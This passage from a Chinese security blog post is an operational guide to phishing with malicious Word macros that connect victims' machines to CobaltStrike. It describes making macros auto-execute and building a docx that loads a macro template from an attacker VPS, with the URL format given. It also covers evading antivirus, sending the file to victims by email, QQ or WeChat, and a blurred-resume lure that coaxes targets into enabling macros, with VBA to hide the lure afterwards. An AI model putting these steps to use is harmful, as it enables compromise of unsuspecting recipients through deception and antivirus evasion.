<img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/8.png" srcset="/img/loading.gif" lazyload class="">



<p>选择使用启用宏的文档&#x2F;模板，这里我分别创建一个宏文件和宏模板文件，创建宏模板文件的作用就是为了后续的远程加载。</p>
<img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/9.png" srcset="/img/loading.gif" lazyload class="">



<p>保存之后应该是会被杀软直接杀掉的，因为并未做任何免杀，这里我们可以找回文件即可</p>
<img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/10.png" srcset="/img/loading.gif" lazyload class="">

<h2 id="4、点击加载的恶意宏文件"><a href="#4、点击加载的恶意宏文件" class="headerlink" title="4、点击加载的恶意宏文件"></a>4、点击加载的恶意宏文件</h2><p>以下展示了目标机打开Word文档且启用宏时，成功上线</p>
<img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/11.png" srcset="/img/loading.gif" lazyload class="">

<img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/12.png" srcset="/img/loading.gif" lazyload class="">



<p>以下展示了目标机右键打开Word模板时，成功上线</p>
<img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/15.png" srcset="/img/loading.gif" lazyload class="">

<img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/16.png" srcset="/img/loading.gif" lazyload class="">

<p>这里需要注意一点，在模版文件上双击默认是以此模版创建新文件，切记，并且双击也不会导致目标机器上线CobaltStrike</p>
<h2 id="5、打开文件直接执行宏代码"><a href="#5、打开文件直接执行宏代码" class="headerlink" title="5、打开文件直接执行宏代码"></a>5、打开文件直接执行宏代码</h2><p>通过上述生成的宏文档，需要在我们打开文件时，手动点击启用宏，下面操作可以使我们在打开文件时，自执行宏代码</p>
<p>打开文本，点击文件</p>
<img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/17.png" srcset="/img/loading.gif" lazyload class="">



<p>点击选项</p>
<img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/18.png" srcset="/img/loading.gif" lazyload class="">



<p>自定义功能区–&gt;开发者工具{打开}</p>
<img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/19.png" srcset="/img/loading.gif" lazyload class="">



<p>之后就和上述操作相同，另存为的 Word 类型务必要选”Word 97-2003 文档 (*.doc)”，即 doc 文件，保证低版本可以打开。之后关闭，再打开即可执行宏代码。</p>
<img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/20.png" srcset="/img/loading.gif" lazyload class="">



<p>这里未做免杀，也是会被直接杀掉，双击打开文本</p>
<img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/21.png" srcset="/img/loading.gif" lazyload class="">



<p>此时宏代码已经运行，在cs端可看到上线</p>
<img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/22.png" srcset="/img/loading.gif" lazyload class="">

<h1 id="二：远程加载恶意Word模板文件上线CobaltStrike"><a href="#二：远程加载恶意Word模板文件上线CobaltStrike" class="headerlink" title="二：远程加载恶意Word模板文件上线CobaltStrike"></a>二：远程加载恶意Word模板文件上线CobaltStrike</h1><p>利用 Word 文档加载附加模板时的缺陷所发起的恶意请求，而达到的攻击目的，所以当目标用户点开攻击者发送的恶意 Word 文档就可以通过向远程服务器发送恶意请求的方式，然后加载模板执行恶意模板的宏。</p>
<p>发送的文档本身不带恶意代码，所以能过很多静态检测。只需要在远程 DOTM 文档中编写宏病毒或者木马即可。</p>
<p>思路：</p>
<p>编写一个带有宏代码的 dotm 文档，上传服务器<br>编写一个能够远程连接的 docx 文档<br>将该文档压缩找到并更改 settings.xml.rels 文件中的内容，将其中的 target 内容修改为服务器上 dotm 文档的 url<br> 将 docx 解压后的内容再以存储模式压缩为 zip<br> 修改后缀名为 docx，打开后即可实现远程注入宏文档</p>
<p>缺点：目标主机的网速决定了加载远程模版的速度。有可能文件打开的会特别慢(例如将远程模版放在github)，受害者可能在文件打开一半的时候强制关闭word。加载位于github上的恶意模板内容，有点慢，我们可以放在vps上，这样速度就快些了。</p>
<p>优点：因为是远程加载，所以免杀效果十分不错。基本不会被杀毒软件拦截。</p>
<img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/13.png" srcset="/img/loading.gif" lazyload class="">

<h2 id="1、将恶意文件上传到服务器vps"><a href="#1、将恶意文件上传到服务器vps" class="headerlink" title="1、将恶意文件上传到服务器vps"></a>1、将恶意文件上传到服务器vps</h2><p>首先我们制作一个带有宏代码的恶意模板文件，放置在vps上，并且通过python开启一个简易的http服务器</p>
<img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/14.png" srcset="/img/loading.gif" lazyload class="">

<h2 id="2、构造恶意的docx钓鱼文件"><a href="#2、构造恶意的docx钓鱼文件" class="headerlink" title="2、构造恶意的docx钓鱼文件"></a>2、构造恶意的docx钓鱼文件</h2><p>打开word找一个任意的模板使用</p>
<p>这里我就通过录制宏，另存为1.dotm模板文件到Office模板目录下，自己制作一个模板</p>
<img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/23.png" srcset="/img/loading.gif" lazyload class="">



<p>直接继续在开始一栏新建–导入之前做好的模板文件1.dotm</p>
<img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/24.png" srcset="/img/loading.gif" lazyload class="">



<p>另保存为鱼摆摆.docx</p>
<img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/25.png" srcset="/img/loading.gif" lazyload class="">



<p>然后再将文件后缀名改为.zip格式文件，并且进行解压缩</p>
<img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/26.png" srcset="/img/loading.gif" lazyload class="">



<p>进入word文件夹中的_rels，找到settings.xml.rels文件，编辑这个文件，将其的target属性的值改为服务器的URL，修改为</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">http://ip:port/模板文件.dotm?raw=true<br>或者是<br>http://域名/模板文件.dotm?raw=true<br>这里的地址也就是vps的地址<br></code></pre></td></tr></table></figure>

<img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/27.png" srcset="/img/loading.gif" lazyload class="">



<p>完成之后，再将所有解压缩的文件再次进行压缩，随后点击修改后缀名为正常的docx文件，这种效果可以起到一定的免杀效果，因为是做了分离免杀，恶意的shellcode并没有放置在文件内部，文件中的内容代码都是正常的，杀软静态查杀是无法查杀到的。</p>
<p>这里附上杀软检测截图</p>
<img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/28.png" srcset="/img/loading.gif" lazyload class="">

<h2 id="3、加载服务器上的恶意文件反弹shell"><a href="#3、加载服务器上的恶意文件反弹shell" class="headerlink" title="3、加载服务器上的恶意文件反弹shell"></a>3、加载服务器上的恶意文件反弹shell</h2><p>将最终生成的恶意文件——fish.docx用邮箱钓鱼、qq或微信文件发送给受害者，当受害者双击打开文件时，启用宏时，恶意代码会执行，目标主机会上线</p>
<img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/12.png" srcset="/img/loading.gif" lazyload class="">

<h2 id="4、进阶伪装–背景虚拟化图片的覆盖"><a href="#4、进阶伪装–背景虚拟化图片的覆盖" class="headerlink" title="4、进阶伪装–背景虚拟化图片的覆盖"></a>4、进阶伪装–背景虚拟化图片的覆盖</h2><p>从之前的实验可以发现，启动world文件时，需要目标用户点击启用宏，才可以上线cs，但是做为稍微有一些安全防备的人员来说，可能并不会开启，所以不能够达到百分百的利用率，以下内容来自公众号Gamma实验室的内容，我们可以借此进行操作。</p>
<p>制作一份简历，或者直接从网上下载</p>
<img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/29.png" srcset="/img/loading.gif" lazyload class="">



<p>打开美图秀秀，打开刚保存的图片，点击背景虚拟化，调整好虚拟化的程度，并且最好是那种若隐若现的感觉，然后加上一些说明内容，比如当前文件为公司重要文件，请打开宏查看全部内容。</p>
<img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/30.png" srcset="/img/loading.gif" lazyload class="">



<p>然后设置图片尺寸为790，1120，为什么会设置成790x1120嘞，只是为了刚好覆盖word里面的文本。我这里设置尺寸稍微大了点，不知是什么情况</p>
<img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/31.png" srcset="/img/loading.gif" lazyload class="">



<p>然后保存，然后就可以看到效果了</p>
<img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/32.png" srcset="/img/loading.gif" lazyload class="">



<p>为什么会设置成790x1120嘞，只是为了刚好覆盖word里面的文本，之后在world文本中直接插入图片</p>
<img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/33.png" srcset="/img/loading.gif" lazyload class="">



<p>插入图片之后，再分别点击宏创建，和之前的步骤一样，将cs生成的宏代码复制粘贴，在Auto_Open（）函数首部编写代码，设置图片位置为0高度为0让宏运行后doc上图片消失，然后保存，office马就制作好了</p>
<img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/34.png" srcset="/img/loading.gif" lazyload class="">



<p>设置代码为</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">Project.ThisDocument.Image1.Top = 0<br>Project.ThisDocument.Image1.Width = 0<br></code></pre></td></tr></table></figure>

<h1 id="三：其他思路"><a href="#三：其他思路" class="headerlink" title="三：其他思路"></a>三：其他思路</h1><p>如果是遇到wps的目标打开上述方法的文件是无法提示宏的，那么我们可能就需要另辟蹊径，但仅限于目前并未研究wps群体，所以后续有相关研究，在进行分享。</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/apt-%E7%A4%BE%E5%B7%A5/">#apt/社工</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>通过制作wrold宏进行钓鱼</div>
      <div>http://example.com/2022/11/06/通过制作wrold宏进行钓鱼/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>John Doe</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2022年11月6日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2022/11/06/%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%9C%9F%E5%AE%9E%E7%9A%84%E9%92%93%E9%B1%BC%E7%AB%99%E7%82%B9/" title="从零到一搭建一个真实的钓鱼站点">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">从零到一搭建一个真实的钓鱼站点</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"live2d-widget-model-epsilon2_1"},"display":{"position":"left","width":250,"height":420},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
